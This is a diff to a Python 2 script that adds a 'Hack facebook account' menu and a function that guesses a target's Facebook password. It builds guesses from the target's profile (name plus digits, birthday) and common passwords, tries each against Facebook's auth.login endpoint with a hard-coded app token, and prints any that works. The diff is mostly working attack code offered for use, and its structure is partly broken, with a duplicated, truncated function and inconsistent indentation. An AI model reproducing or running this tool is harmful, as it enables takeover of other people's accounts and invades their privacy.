@@ -177,6 +177,64 @@ def tokenz():
 		else:
 			keluar()
 
+##### MENU ##########################################
+def menu():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('reset')
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(0.01)
+		login()
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('reset')
+		print"\033[1;91m[!] \033[1;93mAccount Checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(0.01)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\033[1;91m[!] No connection"
+		keluar()
+	os.system("reset")
+	print logo
+	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m Name \033[1;91m: \033[1;92m"+nama+"\033[1;97m"
+	print "║\033[1;91m[\033[1;96m✓\033[1;91m]\033[1;97m ID   \033[1;91m: \033[1;92m"+id
+	print "\033[1;97m╚"+40*"═"
+        print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Hack facebook account
+        print "\033[1;97m║--\033[1;91m> \033[1;92m9.\033[1;97m LogOut            "
+	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit      "
+	print "║"
+	pilih()
+#-
+def pilih():
+	zedd = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
+	if zedd =="":
+		print "\033[1;91m[!] Wrong input"
+		pilih()
+        elif zedd =="1":
+		menu_hack()
+      #-elif zedd =="9":
+		os.system('rm -rf login.txt')
+		os.system('xdg-open https://www.facebook.com/rizz.magizz')
+		keluar()
+	elif zedd =="0":
+		keluar()
+	else:
+		print "\033[1;91m[!] Wrong input"
+		pilih()
+def pilih():
+	zedd = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
+	if zedd =="":
+		print "\033[1;91m[!] Wrong input"
+		pilih()
+        elif zedd =="1":
 ##### MENU HACK #####
 def menu_hack():
 	os.system('reset')
@@ -200,7 +258,8 @@ def menu_hack():
         print "\033[1;97m╔═══════════════════════════════════════╗"
         print "\033[1;97m║ \033[1;97mSelamat.Datang.Di.Tools.Kami       ║"
         print "\033[1;97m╚═══════════════════════════════════════╝"
-        print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Cloning Facebook "
+        print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Mini Hack Facebook(\033[1;92mTarget\033[1;97m)"
+        print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Facebook "
         print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
 	print "║"
 	hack_pilih()
@@ -217,6 +276,184 @@ def hack_pilih():
 	else:
 		print "\033[1;91m[!] Wrong input"
 		hack_pilih()
+
+##### MINI HF #####
+def mini():
+	os.system('reset')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;91m[!] Token not found"
+		os.system('rm -rf login.txt')
+		time.sleep(0.01)
+		login()
+	os.system('reset')
+	print logo
+	print "\033[1;97m[\033[1;91mINFO\033[1;97m] \033[1;91mThe target account must be friends\n       with your account first!"
+	print 42*"\033[1;97m═"
+	try:
+		id = raw_input("\033[1;91m[+] \033[1;92mTarget ID \033[1;91m:\033[1;97m ")
+		jalan('\033[1;91m[✺] \033[1;92mWait a minute \033[1;97m...')
+		r = requests.get("https://graph.facebook.com/"+id+"?access_token="+toket)
+		a = json.loads(r.text)
+		print '\033[1;91m[➹] \033[1;92mName\033[1;97m : '+a['name']
+		jalan('\033[1;91m[+] \033[1;92mCheck \033[1;97m...')
+		time.sleep(2)
+		jalan('\033[1;91m[+] \033[1;92mOpen password \033[1;97m...')
+		time.sleep(2)
+		print 42*"\033[1;97m═"
+		pz1 = a['first_name']+'123'
+		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		y = json.load(data)
+		if 'access_token' in y:
+			print "\033[1;91m[+] \033[1;92mFound"
+			print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+			print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+			print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
+			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+			menu_hack()
+		else:
+			if 'www.facebook.com' in y["error_msg"]:
+				print "\033[1;91m[+] \033[1;92mFound"
+				print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+				print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+				print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+				print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz1
+				raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+				menu_hack()
+			else:
+				pz2 = a['first_name'] + '12345'
+				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+				y = json.load(data)
+				if 'access_token' in y:
+					print "\033[1;91m[+] \033[1;92mFound"
+					print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+					print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+					print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
+					raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+					menu_hack()
+				else:
+					if 'www.facebook.com' in y["error_msg"]:
+						print "\033[1;91m[+] \033[1;92mFound"
+						print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+						print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+						print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+						print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz2
+						raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+						menu_hack()
+					else:
+						pz3 = a['last_name'] + '123'
+						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+						y = json.load(data)
+						if 'access_token' in y:
+							print "\033[1;91m[+] \033[1;92mFound"
+							print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+							print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+							print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
+							raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+							menu_hack()
+						else:
+							if 'www.facebook.com' in y["error_msg"]:
+								print "\033[1;91m[+] \033[1;92mFound"
+								print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+								print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+								print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+								print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz3
+								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+								menu_hack()
+							else:
+								lahir = a['birthday']
+								pz4 = lahir.replace('/', '')
+								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+								y = json.load(data)
+								if 'access_token' in y:
+									print "\033[1;91m[+] \033[1;92mFound"
+									print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+									print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+									print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
+									raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+									menu_hack()
+								else:
+									if 'www.facebook.com' in y["error_msg"]:
+										print "\033[1;91m[+] \033[1;92mFound"
+										print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+										print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+										print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+										print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz4
+										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+										menu_hack()
+									else:
+										lahirs = a['birthday']
+										gaz = lahirs.replace('/', '')
+										pz5 = a['first_name']+gaz
+										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+										y = json.load(data)
+										if 'access_token' in y:
+											print "\033[1;91m[+] \033[1;92mFound"
+											print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+											print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+											print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
+											raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+											menu_hack()
+										else:
+											if 'www.facebook.com' in y["error_msg"]:
+												print "\033[1;91m[+] \033[1;92mFound"
+												print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+												print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+												print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+												print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz5
+												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+												menu_hack()
+											else:
+												pz6 = "bintang123"
+												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+												y = json.load(data)
+												if 'access_token' in y:
+													print "\033[1;91m[+] \033[1;92mFound"
+													print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+													print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+													print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+													raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+													menu_hack()
+												else:
+													if 'www.facebook.com' in y["error_msg"]:
+														print "\033[1;91m[+] \033[1;92mFound"
+														print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+														print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+														print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+														print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+														menu_hack()
+													else:
+														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
+														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+														y = json.load(data)
+														if 'access_token' in y:
+															print "\033[1;91m[+] \033[1;92mFound"
+															print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+															print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+															print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz7
+															raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+															menu_hack()
+														else:
+															if 'www.facebook.com' in y["error_msg"]:
+																print "\033[1;91m[+] \033[1;92mFound"
+																print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
+																print "\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mName\033[1;97m     : "+a['name']
+																print "\033[1;91m[➹] \033[1;92mUsername\033[1;97m : "+id
+																print "\033[1;91m[➹] \033[1;92mPassword\033[1;97m : "+pz6
+																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																menu_hack()
+															else:
+																print "\033[1;91m[!] Sorry, failed to open the target password :("
+																print "\033[1;91m[!] try it another way."
+																raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+																menu_hack()
+	except KeyError:
+		print "\033[1;91m[!] Terget not found"
+		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
+		menu_hack()
+								
 		
 def super():
 	global toket
